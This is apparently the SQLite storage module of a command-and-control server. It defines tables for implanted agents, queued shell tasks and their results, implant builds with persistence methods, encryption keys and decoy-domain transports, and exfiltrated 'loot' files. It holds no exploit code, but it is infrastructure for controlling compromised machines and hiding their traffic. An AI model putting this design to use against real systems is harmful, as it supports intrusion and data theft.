import sqlite3
import os
from storage_permissions import private_database

DB_PATH = os.environ.get(
    "C2_DB_PATH", os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2.db")
)


def get_db_connection():
    """Return a database connection with Row factory enabled."""
    private_database(DB_PATH)
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA foreign_keys = ON")
    return conn


def init_db():
    """Create the database tables if they don't exist."""
    conn = get_db_connection()
    cursor = conn.cursor()

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY,
            hostname TEXT NOT NULL,
            ip TEXT,
            os TEXT,
            key_id TEXT,
            build_id INTEGER,
            secret_hash TEXT,
            status TEXT DEFAULT 'active',
            destroyed_at TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (build_id) REFERENCES builds(id)
        )
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT NOT NULL,
            command TEXT NOT NULL,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (agent_id) REFERENCES agents(id)
        )
    """)

    for _col, _coltype in (
        ("key_id", "TEXT"),
        ("secret_hash", "TEXT"),
        ("build_id", "INTEGER"),
        ("status", "TEXT DEFAULT 'active'"),
        ("destroyed_at", "TIMESTAMP"),
    ):
        try:
            cursor.execute(f"ALTER TABLE agents ADD COLUMN {_col} {_coltype}")
        except sqlite3.OperationalError:
            pass  # Column already exists

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            task_id INTEGER NOT NULL,
            output TEXT,
            received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (task_id) REFERENCES tasks(id)
        )
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS builds (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            filename TEXT NOT NULL,
            target_os TEXT NOT NULL,
            arch TEXT NOT NULL,
            server_url TEXT NOT NULL,
            callback_interval TEXT NOT NULL,
            persistence INTEGER DEFAULT 0,
            file_path TEXT NOT NULL,
            file_size INTEGER DEFAULT 0,
            key_id TEXT,
            encryption_key TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS build_cleanup_queue (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            file_path TEXT NOT NULL UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS file_cleanup_queue (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            kind TEXT NOT NULL CHECK (kind IN ('loot', 'staged')),
            file_path TEXT NOT NULL UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    # Add type column to tasks table (safe to re-run, ignores if it exists)
    try:
        cursor.execute("ALTER TABLE tasks ADD COLUMN type TEXT DEFAULT 'shell'")
    except sqlite3.OperationalError:
        pass  # Column already exists

    # Add columns for encryption key storage (safe to re-run, ignores if they exist)
    for _col, _coltype in [("key_id", "TEXT"), ("encryption_key", "TEXT"), ("cert_pin", "TEXT")]:
        try:
            cursor.execute(f"ALTER TABLE builds ADD COLUMN {_col} {_coltype}")
        except sqlite3.OperationalError:
            pass  # Column already exists

    # REALITY transport columns (safe to re-run)
    for _col, _coltype in [("transport_mode", "TEXT DEFAULT 'http'"), ("decoy_domain", "TEXT")]:
        try:
            cursor.execute(f"ALTER TABLE builds ADD COLUMN {_col} {_coltype}")
        except sqlite3.OperationalError:
            pass  # Column already exists

    # Migrate old boolean persistence values (0/1) to method strings
    try:
        cursor.execute("UPDATE builds SET persistence = 'registry' WHERE persistence = '1'")
        cursor.execute("UPDATE builds SET persistence = 'none' WHERE persistence = '0'")
    except sqlite3.OperationalError:
        pass

    # Normalize legacy rows: builds with a cert_pin but transport_mode='http'
    # predate the explicit transport selector and should be labelled 'https_pinned'.
    # Only updates rows that are clearly wrong; intentionally set modes are untouched.
    try:
        cursor.execute(
            "UPDATE builds SET transport_mode = 'https_pinned' "
            "WHERE cert_pin IS NOT NULL AND cert_pin != '' "
            "AND (transport_mode IS NULL OR transport_mode = 'http')"
        )
    except sqlite3.OperationalError:
        pass

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS loot (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT NOT NULL,
            filename TEXT NOT NULL,
            original_path TEXT,
            file_path TEXT NOT NULL,
            file_size INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS staged_files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            filename TEXT NOT NULL,
            file_path TEXT NOT NULL,
            file_size INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS server_config (
            key TEXT PRIMARY KEY,
            value TEXT NOT NULL
        )
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS seen_nonces (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            kid TEXT NOT NULL,
            nonce TEXT NOT NULL,
            received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            UNIQUE(kid, nonce)
        )
    """)

    cursor.execute("""
        CREATE INDEX IF NOT EXISTS idx_seen_nonces_received_at
        ON seen_nonces (received_at)
    """)

    cursor.execute("""
        CREATE INDEX IF NOT EXISTS idx_builds_key_id
        ON builds (key_id, id DESC)
    """)

    cursor.execute("""
        CREATE INDEX IF NOT EXISTS idx_agents_last_seen
        ON agents (last_seen DESC)
    """)

    cursor.execute("""
        CREATE INDEX IF NOT EXISTS idx_agents_build_id
        ON agents (build_id)
    """)

    # Disambiguate legacy agents: if an agent has key_id and build_id is NULL,
    # and exactly one build exists for that key_id, associate it directly.
    try:
        cursor.execute("""
            UPDATE agents
            SET build_id = (
                SELECT b.id FROM builds b WHERE b.key_id = agents.key_id
            )
            WHERE (build_id IS NULL OR build_id = 0)
              AND key_id IS NOT NULL
              AND key_id != ''
              AND (SELECT COUNT(*) FROM builds b WHERE b.key_id = agents.key_id) = 1
        """)
    except sqlite3.OperationalError:
        pass

    conn.commit()
    conn.close()


def purge_retired_build_nonces():
    """Keep replay records while any build with their key ID exists."""
    conn = get_db_connection()
    try:
        conn.execute(
            "DELETE FROM seen_nonces WHERE NOT EXISTS "
            "(SELECT 1 FROM builds WHERE builds.key_id = seen_nonces.kid)"
        )
        conn.commit()
    finally:
        conn.close()


def purge_destroyed_agents(max_age_hours=24):
    """Hard-delete self-destruct tombstones after a grace period for lost-ack retries."""
    conn = get_db_connection()
    try:
        rows = conn.execute(
            "SELECT id FROM agents WHERE status = 'destroyed' "
            "AND destroyed_at IS NOT NULL "
            "AND destroyed_at <= datetime('now', ?)",
            (f"-{int(max_age_hours)} hours",),
        ).fetchall()
        for row in rows:
            agent_id = row["id"]
            conn.execute(
                "DELETE FROM results WHERE task_id IN "
                "(SELECT id FROM tasks WHERE agent_id = ?)",
                (agent_id,),
            )
            conn.execute("DELETE FROM tasks WHERE agent_id = ?", (agent_id,))
            conn.execute("DELETE FROM agents WHERE id = ?", (agent_id,))
        conn.commit()
    finally:
        conn.close()


def audit_build_key_collisions(conn=None) -> list[dict]:
    """
    Audit the builds table for key_id collisions and ambiguous agent associations.
    Returns a list of collision report dicts containing colliding key_id, build records,
    and associated agents.
    """
    close_conn = False
    if conn is None:
        conn = get_db_connection()
        close_conn = True

    try:
        rows = conn.execute("""
            SELECT key_id, COUNT(*) as build_count, GROUP_CONCAT(id) as build_ids
            FROM builds
            WHERE key_id IS NOT NULL AND key_id != ''
            GROUP BY key_id
            HAVING build_count > 1
        """).fetchall()

        collisions = []
        for r in rows:
            build_ids = [int(x) for x in r["build_ids"].split(",")]
            placeholders = ",".join("?" * len(build_ids))
            build_rows = conn.execute(
                f"SELECT id, filename, transport_mode, decoy_domain FROM builds WHERE id IN ({placeholders})",
                build_ids
            ).fetchall()

            agent_rows = conn.execute(
                "SELECT id, hostname, key_id, build_id FROM agents WHERE key_id = ?",
                (r["key_id"],)
            ).fetchall()

            collisions.append({
                "key_id": r["key_id"],
                "build_count": r["build_count"],
                "builds": [dict(b) for b in build_rows],
                "agents": [dict(a) for a in agent_rows],
            })
        return collisions
    finally:
        if close_conn:
            conn.close()


# Initialize database at import time
init_db()
